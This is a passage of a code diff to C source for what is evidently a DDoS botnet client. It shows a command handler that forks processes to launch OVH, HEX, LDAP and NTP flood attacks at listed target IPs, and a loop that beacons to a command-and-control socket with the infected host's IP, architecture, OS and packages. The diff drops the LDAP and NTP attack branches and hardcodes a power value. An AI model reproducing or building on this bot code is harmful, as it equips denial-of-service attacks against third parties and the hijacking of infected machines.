                                 _exit(0);
                                 }
                                 hi = strtok(NULL, ",");
@@ -1926,7 +2121,7 @@ void cncinput(int argc, unsigned char * argv[])
                 {
                         if (!listFork()) 
                         {
-                                sendOVHL7(ip, port, time, power);
+                                sendOVHL7(ip, port, time, 250);
                                 _exit(0);
                         }
                 }
@@ -1935,9 +2130,6 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "HEX"))
         {
-                if(argc < 4 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 65500);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1960,70 +2152,6 @@ void cncinput(int argc, unsigned char * argv[])
                         if (!listFork()) 
                         {
                                 sendHEX(ip, port, time, packetsize);
-                                _exit(0);
-                        }
-                }
-                return;
-        }
-
-        if(!strcmp(argv[0], "LDAP"))
-        {
-                if(argc < 3 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
-                unsigned char *ip = argv[1];
-                int port = atoi(argv[2]);
-                int time = atoi(argv[3]);
-
-                if (strstr(ip, ",") != NULL) 
-                {
-                        unsigned char * hi = strtok(ip, ",");
-                        while (hi != NULL) 
-                        {
-                                if (!listFork()) {
-                                sendLDAP(hi, port, time);
-                                _exit(0);
-                                }
-                                hi = strtok(NULL, ",");
-                        }
-                } 
-                else 
-                {
-                        if (!listFork()) 
-                        {
-                                sendLDAP(ip, port, time);
-                                _exit(0);
-                        }
-                }
-                return;
-        }
-
-        if(!strcmp(argv[0], "NTP"))
-        {
-                if(argc < 3 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
-                unsigned char *ip = argv[1];
-                int port = atoi(argv[2]);
-                int time = atoi(argv[3]);
-
-                if (strstr(ip, ",") != NULL) 
-                {
-                        unsigned char * hi = strtok(ip, ",");
-                        while (hi != NULL) 
-                        {
-                                if (!listFork()) {
-                                sendNTP(hi, port, time);
-                                _exit(0);
-                                }
-                                hi = strtok(NULL, ",");
-                        }
-                } 
-                else 
-                {
-                        if (!listFork()) 
-                        {
-                                sendNTP(ip, port, time);
                                 _exit(0);
                         }
                 }
@@ -2102,7 +2230,7 @@ int main(int argc, unsigned char *argv[])
         while(1)
         {
                 if(initConnection()) { sleep(5); continue; }
-                sockprintf(SSPsock, "\x1b[1;31mSSP\x1b[1;37m[\x1b[1;31mV5.0\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]", inet_ntoa(ourIP), defarchs(), defopsys(), defpkgs());
+                sockprintf(SSPsock, "\x1b[1;35mSSP\x1b[1;37m[\x1b[1;35mV3.0\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]", inet_ntoa(ourIP), defarchs(), defopsys(), defpkgs());
                 char commBuf[4096];
                 int got = 0;
                 int i = 0;
